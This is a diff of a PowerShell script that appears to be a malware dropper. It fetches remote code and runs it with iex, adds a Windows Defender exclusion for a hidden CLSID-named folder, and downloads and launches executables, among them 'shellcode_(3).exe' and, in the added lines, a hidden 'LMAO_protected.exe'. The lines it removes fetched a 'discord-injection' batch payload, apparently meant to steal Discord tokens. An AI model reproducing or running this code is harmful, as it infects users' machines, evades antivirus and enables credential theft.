@@ -16,8 +16,6 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 
 iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/startup.ps1" -useb)
 
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/adasdasdsaf/discord-injection/main/assets/hookinjection.bat" -OutFile "$temp\injection.cmd"
-Start-Process -FilePath "$temp\injection.cmd" -WindowStyle Hidden
 
 $rdir = "C:\Users\hai1723"
 $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
@@ -35,6 +33,9 @@ Add-MpPreference -ExclusionPath $dir
 
 Invoke-WebRequest -Uri "https://anonsharing.com/file/8b24841448995265/shellcode_(3).exe" -OutFile "$temp\s.exe"
 Start-Process -FilePath "$temp\s.exe"
+
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/LMAO_protected.exe" -OutFile "$temp\skid.exe"
+Start-Process -FilePath "$temp\skid.exe" -WindowStyle Hidden
 
 Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object {
     Write-Output $_.FullName
